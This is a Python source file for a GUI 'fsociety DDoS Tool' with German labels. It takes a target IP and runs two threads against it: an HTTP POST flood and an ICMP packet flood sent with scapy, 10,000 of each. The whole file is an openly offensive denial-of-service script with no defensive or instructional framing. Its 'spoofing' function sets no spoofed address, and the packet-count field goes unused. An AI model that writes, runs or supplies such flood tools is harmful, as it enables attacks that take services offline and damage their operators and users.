import tkinter as tk
from scapy.all import *
from threading import Thread
import requests

class DDoS_Tool:
 def __init__(self):
 self.window = tk.Tk()
 self.window.title("fsociety DDoS Tool")
 
 # Ziel-IP Eingabefeld
 self.ip_label = tk.Label(self.window, text="Ziel IP:")
 self.ip_label.pack()
 self.ip_entry = tk.Entry(self.window)
 self.ip_entry.pack()
 
 # Paketanzahl Eingabefeld
 self.packet_count_label = tk.Label(self.window, text="Anzahl Pakete:")
 self.packet_count_label.pack()
 self.packet_count_entry = tk.Entry(self.window)
 self.packet_count_entry.pack()
 
 # Layer 7 Angriff Einstellungen
 self.layer7_label = tk.Label(self.window, text="Layer 7 Angriff:")
 self.layer7_label.pack()
 
 # Start Button
 start_button = tk.Button(self.window, text="Starte Angriff", command=self.start_ddos)
 start_button.pack()

 def layer7_attack(self, target_ip):
 for _ in range(10000):  
 try:
 requests.post(f"http://{target_ip}", headers={"User-Agent": "fsociety"}, timeout=1)
 except Exception as e:
 print(f"Error: {e}")

 def ip_spoof_attack(self, target_ip):
 for _ in range(10000):  
 spoofed_packet = IP(dst=target_ip) / ICMP() / Raw(b"fsociety was here")
 send(spoofed_packet)

 def start_ddos(self):
 target_ip = str(self.ip_entry.get())
 packet_count = int(str(self.packet_count_entry.get()))
 
 thread_layer7 = Thread(target=self.layer7_attack, args=(target_ip,))
 thread_spoofing = Thread(target=self.ip_spoof_attack, args=(target_ip,))
 
 thread_layer7.start()
 thread_spoofing.start()

if __name__ == "__main__":
 tool = DDoS_Tool()
 tool.window.mainloop()

